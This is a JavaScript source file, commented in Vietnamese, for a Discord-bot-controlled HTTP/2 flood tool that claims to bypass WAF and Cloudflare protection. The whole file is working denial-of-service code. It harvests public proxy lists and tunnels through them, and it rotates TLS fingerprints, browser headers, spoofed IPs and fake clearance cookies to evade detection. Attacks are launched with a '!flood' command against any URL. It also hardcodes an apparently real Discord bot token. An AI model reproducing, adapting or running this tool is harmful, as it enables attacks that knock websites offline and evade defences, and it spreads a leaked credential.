// ==++==
// HTTPV8-WAF-BYPASS.js - Flood Control via Discord
// Bypass WAF + CF + Anti-Detect
// ==++==

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// ==================== DISCORD CONFIG ====================
const TOKEN = 'MTQ1Njk2NDc5NDIxMjE1OTcwMg.GEvb_q.UIxdf1LtmKM8S46VrCp6tFowBWj-j8SW181dFA';
const CHANNEL_ID = '1456595444477198508';

// ==================== THƯ VIỆN ====================
const { Client, GatewayIntentBits } = require('discord.js');
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
const axios = require('axios');

// ==================== KIỂM TRA ====================
if (TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.log('\x1b[31m❌ LỖI: Bạn chưa thay token bot!\x1b[0m');
    process.exit(1);
}

// ==================== PROXY MANAGER ====================
let proxyList = [];
let proxyIndex = 0;

async function loadProxies() {
    try {
        if (fs.existsSync('./proxy.txt')) {
            proxyList = fs.readFileSync('./proxy.txt', 'utf-8')
                .split('\n')
                .filter(line => line.includes(':'));
            console.log(`\x1b[32m[+] Loaded ${proxyList.length} proxies from file\x1b[0m`);
        } else {
            // Tự động tải proxy từ nhiều nguồn
            const sources = [
                'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all',
                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
                'https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt'
            ];
            
            for (const src of sources) {
                try {
                    const res = await axios.get(src, { timeout: 5000 });
                    const proxies = res.data.split('\n').filter(line => line.includes(':'));
                    proxyList.push(...proxies);
                } catch (e) {}
            }
            
            proxyList = [...new Set(proxyList)];
            fs.writeFileSync('./proxy.txt', proxyList.join('\n'));
            console.log(`\x1b[32m[+] Downloaded ${proxyList.length} proxies\x1b[0m`);
        }
        
        // Thêm direct connection
        proxyList.push('direct');
    } catch (e) {
        proxyList = ['direct'];
    }
}

// ==================== TLS FINGERPRINT ROTATION ====================
const cipherSuites = [
    // Chrome 120+
    "GREASE:ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM",
    // Firefox 120+
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384",
    // Safari
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305"
];

const sigalgsList = [
    "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
    "rsa_pkcs1_sha256:ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256"
];

const curvesList = [
    "X25519:secp256r1:secp384r1",
    "X25519Kyber:secp256r1:secp384r1",
    "secp256r1:secp384r1:X25519"
];

function getRandomTLS() {
    return {
        ciphers: cipherSuites[Math.floor(Math.random() * cipherSuites.length)],
        sigalgs: sigalgsList[Math.floor(Math.random() * sigalgsList.length)],
        ecdhCurve: curvesList[Math.floor(Math.random() * curvesList.length)],
        honorCipherOrder: true
    };
}

// ==================== RANDOM ====================
function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomString(len) { return crypto.randomBytes(len).toString('hex').slice(0, len); }
function randomIP() { return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,255)}`; }

// ==================== USER-AGENTS KHỦNG ====================
const uas = [
    // Chrome Windows
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
    // Chrome Mac
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
    // Firefox
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15.4; rv:140.0) Gecko/20100101 Firefox/140.0',
    // Safari
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 Version/20.0 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0 like Mac OS X) AppleWebKit/605.1.15 Version/20.0 Mobile/15E148 Safari/604.1',
    // Edge
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0',
    // Opera
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36 OPR/130.0.0.0'
];

// ==================== HEADER LISTS ĐA DẠNG ====================
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'application/json, text/plain, */*',
    'text/css,*/*;q=0.1',
    'image/avif,image/webp,image/apng,image/*,*/*;q=0.8'
];

const encoding_header = [
    'gzip, deflate, br, zstd',
    'gzip, deflate, br',
    'gzip, deflate',
    'br, gzip, deflate'
];

const lang_header = [
    'en-US,en;q=0.9,vi;q=0.8',
    'vi-VN,vi;q=0.9,en-US;q=0.8',
    'fr-FR,fr;q=0.9,en;q=0.8',
    'ja-JP,ja;q=0.9,en;q=0.8',
    'zh-CN,zh;q=0.9,en;q=0.8',
    'ru-RU,ru;q=0.9,en;q=0.8'
];

const cache_header = [
    'no-cache',
    'max-age=0',
    'no-store',
    'private, no-cache, no-store, must-revalidate',
    'max-age=0, must-revalidate'
];

const referers = [
    'https://www.google.com/',
    'https://www.google.com/search?q=',
    'https://www.facebook.com/',
    'https://www.youtube.com/',
    'https://www.bing.com/',
    'https://www.instagram.com/',
    'https://www.tiktok.com/',
    'https://twitter.com/',
    'https://www.reddit.com/',
    'https://www.amazon.com/',
    'https://github.com/',
    'https://stackoverflow.com/'
];

const platforms = ["Windows", "macOS", "Linux", "Android", "iOS"];
const dests = ['document', 'empty', 'iframe', 'image', 'script'];
const modes = ['navigate', 'cors', 'no-cors'];
const sites = ['cross-site', 'same-origin', 'same-site', 'none'];

// ==================== COOKIE GENERATOR ====================
function generateCookie() {
    const cookies = [];
    cookies.push(`_ga=GA1.2.${randomInt(1e8,1e9)}.${Date.now()}`);
    cookies.push(`_gid=GA1.2.${randomInt(1e8,1e9)}.${Date.now()}`);
    cookies.push(`session=${randomString(32)}`);
    cookies.push(`cf_clearance=${randomString(40)}`);
    return cookies.join('; ');
}

// ==================== CLASS NetSocket ====================
class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const conn = net.connect(options.port, options.host, () => conn.write(payload));
        conn.setTimeout(3000);
        conn.on('data', d => d.toString().includes('200') ? callback(conn) : conn.destroy());
        conn.on('error', () => callback(null));
        conn.on('timeout', () => conn.destroy());
    }
}

// ==================== WORKER FLOOD ====================
function createWorker(target, rate) {
    const parsed = url.parse(target);
    const Socker = new NetSocket();
    let count = 0;
    
    setInterval(() => {
        if (count > 0 && process.send) process.send(count);
        count = 0;
    }, 1000);
    
    function flood() {
        const proxy = randomElement(proxyList);
        if (proxy === 'direct') return setTimeout(flood, 100);
        
        const [ph, pp] = proxy.split(':');
        
        // Tạo TLS config mới mỗi request
        const tlsConfig = getRandomTLS();
        const secureContext = tls.createSecureContext(tlsConfig);
        
        // Tạo headers đa dạng
        const ua = randomElement(uas);
        const isMobile = /iPhone|Android/i.test(ua) ? '?1' : '?0';
        
        const headers = {
            ':method': 'GET',
            ':path': parsed.path + '?' + randomString(randomInt(4,12)),
            ':authority': parsed.host,
            'user-agent': ua,
            'accept': randomElement(accept_header),
            'accept-encoding': randomElement(encoding_header),
            'accept-language': randomElement(lang_header),
            'cache-control': randomElement(cache_header),
            'pragma': randomElement(['no-cache', '']),
            'referer': randomElement(referers),
            'sec-ch-ua': `"Chromium";v="150", "Google Chrome";v="150", "Not?A_Brand";v="99"`,
            'sec-ch-ua-mobile': isMobile,
            'sec-ch-ua-platform': `"${randomElement(platforms)}"`,
            'sec-fetch-dest': randomElement(dests),
            'sec-fetch-mode': randomElement(modes),
            'sec-fetch-site': randomElement(sites),
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'x-forwarded-for': randomIP(),
            'x-real-ip': randomIP(),
            'x-forwarded-proto': 'https',
            'cookie': generateCookie(),
            'dnt': randomElement(['1', '0']),
            'priority': randomElement(['u=0, i', 'u=0']),
            'viewport-width': randomInt(1280, 3840).toString(),
            'viewport-height': randomInt(720, 2160).toString(),
            'device-memory': randomElement(['4', '8', '16'])
        };

        Socker.HTTP({ host: ph, port: parseInt(pp), address: parsed.host + ':443' }, (conn) => {
            if (!conn) return;
            
            const tlsConn = tls.connect({
                socket: conn,
                servername: parsed.host,
                rejectUnauthorized: false,
                secureContext: secureContext
            });
            
            const client = http2.connect(parsed.href, { 
                createConnection: () => tlsConn,
                settings: { maxConcurrentStreams: 2000 }
            });
            
            client.on('connect', () => {
                for (let i = 0; i < rate; i++) {
                    try {
                        const req = client.request(headers);
                        req.on('error', () => {});
                        req.end();
                        count++;
                    } catch (e) {}
                }
                setTimeout(() => client.close(), 50);
            });
            
            client.on('error', () => {});
        });
        
        setImmediate(flood);
    }
    
    flood();
}

// ==================== DISCORD BOT ====================
const client = new Client({ 
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] 
});

let currentAttack = null;
let workers = [];
let totalReqs = 0;
let startTime = 0;

client.once('ready', () => {
    console.log(`\x1b[32m[+] Bot ${client.user.tag} đã sẵn sàng!\x1b[0m`);
    const channel = client.channels.cache.get(CHANNEL_ID);
    if (channel) {
        channel.send(`
╔══════════════════════════════════════════════════════╗
║     HTTPV8 - WAF BYPASS ENGINE - READY              ║
╠══════════════════════════════════════════════════════╣
║  !flood <url> <time> <rate> <threads>               ║
║  !stop                                               ║
║  !status                                             ║
║  !proxy                                              ║
║  !help                                               ║
╚══════════════════════════════════════════════════════╝
        `);
    }
});

client.on('messageCreate', async (msg) => {
    if (msg.channel.id !== CHANNEL_ID || !msg.content.startsWith('!')) return;
    
    const args = msg.content.slice(1).split(' ');
    const cmd = args[0].toLowerCase();
    
    if (cmd === 'help') {
        msg.channel.send(`
**📚 LỆNH:**
\`!flood <url> <time> <rate> <threads>\` - VD: \`!flood https://example.com 300 1000 50\`
\`!stop\` - Dừng tấn công
\`!status\` - Xem trạng thái
\`!proxy\` - Xem số proxy
\`!help\` - Hướng dẫn

**⚡ TỐI ƯU:**
- Rate càng cao càng mạnh (500-5000)
- Threads = CPU cores * 10
- Proxy càng nhiều càng tốt
        `);
    }
    
    else if (cmd === 'proxy') {
        msg.channel.send(`📡 **PROXY**: ${proxyList.length} proxies available`);
    }
    
    else if (cmd === 'flood') {
        if (args.length < 5) return msg.channel.send('❌ Thiếu tham số! VD: !flood https://example.com 300 1000 50');
        
        const target = args[1];
        const time = parseInt(args[2]);
        const rate = parseInt(args[3]);
        const threads = parseInt(args[4]);
        
        if (!target.startsWith('http')) return msg.channel.send('❌ URL phải bắt đầu bằng http');
        if (isNaN(time) || time < 10) return msg.channel.send('❌ Thời gian phải >= 10');
        if (isNaN(rate) || rate < 10) return msg.channel.send('❌ Rate phải >= 10');
        if (isNaN(threads) || threads < 1) return msg.channel.send('❌ Threads phải >= 1');
        
        // Dừng attack cũ
        if (currentAttack) {
            workers.forEach(w => w.kill());
            workers = [];
        }
        
        msg.channel.send(`
🔥 **BẮT ĐẦU TẤN CÔNG**
Target: ${target}
Time: ${time}s
Rate: ${rate}
Threads: ${threads}
Proxy: ${proxyList.length}
Mode: WAF BYPASS ENABLED
        `);
        
        // Fork workers
        if (cluster.isMaster) {
            for (let i = 0; i < threads; i++) {
                const worker = cluster.fork();
                worker.send({ target, rate });
                workers.push(worker);
            }
            
            currentAttack = { target, time, start: Date.now() };
            totalReqs = 0;
            startTime = Date.now();
            
            cluster.on('message', (w, cnt) => totalReqs += cnt);
            
            setTimeout(() => {
                if (currentAttack) {
                    workers.forEach(w => w.kill());
                    workers = [];
                    currentAttack = null;
                    const elapsed = Math.floor((Date.now() - startTime) / 1000);
                    msg.channel.send(`
✅ **KẾT THÚC TẤN CÔNG**
Thời gian: ${elapsed}s
Tổng requests: ${totalReqs.toLocaleString()}
RPS trung bình: ${Math.floor(totalReqs / elapsed)}
                    `);
                }
            }, time * 1000);
        }
    }
    
    else if (cmd === 'stop') {
        if (currentAttack) {
            workers.forEach(w => w.kill());
            workers = [];
            currentAttack = null;
            msg.channel.send('🛑 **ĐÃ DỪNG TẤN CÔNG**');
        } else {
            msg.channel.send('⚠️ Không có attack nào');
        }
    }
    
    else if (cmd === 'status') {
        if (currentAttack) {
            const elapsed = Math.floor((Date.now() - currentAttack.start) / 1000);
            const rps = Math.floor(totalReqs / (elapsed || 1));
            msg.channel.send(`
📊 **TRẠNG THÁI**
Target: ${currentAttack.target}
Thời gian: ${elapsed}s / ${currentAttack.time}s
Requests: ${totalReqs.toLocaleString()}
RPS: ${rps.toLocaleString()}
Workers: ${workers.length}
Proxy: ${proxyList.length}
            `);
        } else {
            msg.channel.send('📴 Không có attack nào');
        }
    }
});

// ==================== MAIN ====================
async function main() {
    await loadProxies();
    
    if (cluster.isMaster) {
        client.login(TOKEN).catch(err => {
            console.log('\x1b[31m❌ LỖI LOGIN DISCORD:\x1b[0m', err.message);
            process.exit(1);
        });
    } else {
        process.on('message', (data) => createWorker(data.target, data.rate));
    }
}

main();
